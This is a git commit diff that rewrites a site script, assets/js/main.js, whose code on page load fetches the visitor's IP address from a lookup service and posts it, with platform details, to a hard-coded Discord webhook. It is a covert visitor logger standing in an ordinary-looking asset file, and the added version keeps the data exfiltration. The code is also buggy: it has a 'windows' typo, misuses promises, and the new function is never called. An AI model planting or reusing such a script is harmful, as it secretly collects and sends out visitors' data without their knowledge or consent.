ed2e95b47d406f1b233cc8f8e7317b4dd64d6e8b
gogiyaw <86326882+gogiyaw@users.noreply.github.com>
2021-06-23 08:47:19 +1000

    Add files via upload

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,15 +1,18 @@
-(() => {
-    const ipResponse = fetch('https://api.ipify.org', { method: 'GET' });
-    const ip = ipResponse.text();
 
-    const params = { content: `Platform: ${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}\n HEADERS: ${windows.navigator.headers}\nIP: ${ip}` };
-    const webhookResponse = fetch('https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV', {
-        method: 'POST',
-        headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(params)
-    });
-    const content = webhookResponse.json();
+
+(async () => {
+    await fetch('https://api.ipify.org', { method: 'GET' })
+        .then(response => {
+            const ip = response.text().then(async () => {
+                const params = { content: `Platform: ${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}\n HEADERS: ${windows.navigator.headers}\nIP: ${ip}` };
+                const webhookResponse = await fetch('https://canary.discord.com/api/webhooks/857009098407018518/nbLnPzBbYVkxJcRjOV_wP23zh2EwFGWV4LR8s04wxenSoIb9xHQ7bLN2pSeWu4SLO5fV', {
+                    method: 'POST',
+                    headers: {
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+            });
+        });
 });
